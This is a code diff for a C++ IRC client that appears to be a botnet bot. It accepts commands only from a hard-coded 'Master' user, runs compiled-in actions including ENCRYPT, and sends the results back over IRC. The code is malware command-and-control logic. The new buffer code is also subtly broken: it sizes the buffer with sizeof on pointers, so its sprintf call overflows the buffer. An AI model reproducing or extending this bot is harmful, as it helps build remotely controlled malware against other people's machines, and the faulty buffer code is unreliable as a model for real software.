@@ -5,8 +5,8 @@
 #include <string>
 #include <csignal>
 
-IrcClient::IrcClient(const char* server, int port)
-    : server(server), port(port), session(nullptr) {
+IrcClient::IrcClient(const char* server, int port, const char* exeName)
+    : server(server), port(port), exeName(exeName), session(nullptr) {
     memset(&callbacks, 0, sizeof(callbacks));
     callbacks.event_connect = event_connect;
     callbacks.event_quit = dump_event;
@@ -52,9 +52,6 @@ void IrcClient::signalHandler(int signal) {
 
 std::string IrcClient::concatenateParams(const char* event, const char* origin, const char** params, unsigned int count) {
     std::string result;
-    //printf("Event: %s\n", event);
-    //printf("Origin: %s\n", origin);
-    //printf("Params[0]: %s\n", params[0]);
 
     if (strcmp(origin, "") != 0) {
         result += origin;
@@ -138,14 +135,18 @@ void IrcClient::parseEvent(irc_session_t* session, const char* event, const char
     if (!instance->isRegistered()) {
         return;
     }
-    
-    ActionInfo actionInfo = MessageParser::parseMessage(receivedMessage, "Master!masterUser@192.168.1.17");
+
+    const char* masterIdentifier = "Master!masterUser@";
+    size_t size1 = sizeof(masterIdentifier);
+    size_t size2 = sizeof(instance->server);
+    char buffer[size1 + size2 + 1];
+    std::sprintf(buffer, "%s%s", masterIdentifier, instance->server);
+
+    ActionInfo actionInfo = MessageParser::parseMessage(receivedMessage, buffer);
     instance->createAction(actionInfo);
 }
 
-
 void IrcClient::createAction(ActionInfo actionInfo) {
-    IrcClient* instance = getInstance(session);
     Action* action = nullptr;
     printf("Create action hit\n");
     #ifdef ENABLE_PING_ACTION
@@ -157,14 +158,16 @@ void IrcClient::createAction(ActionInfo actionInfo) {
 
     #ifdef ENABLE_ENCRYPT_ACTION
     if (actionInfo.getActionType() == ActionType::ENCRYPT) { // check if bot was compiled to support this
-        printf("encrypt created\n");
-        action = new EncryptAction(actionInfo.getActionParams(), instance);
+        printf("ENCRYPT created\n");
+        action = new EncryptAction(actionInfo.getActionParams());
     }
     #endif
 
     if (action) {
         action->execute();
+        if (action->getMessage() != "") {
+            sendCommand(action->getMessage());
+        }
         delete action;
     }
 }
-
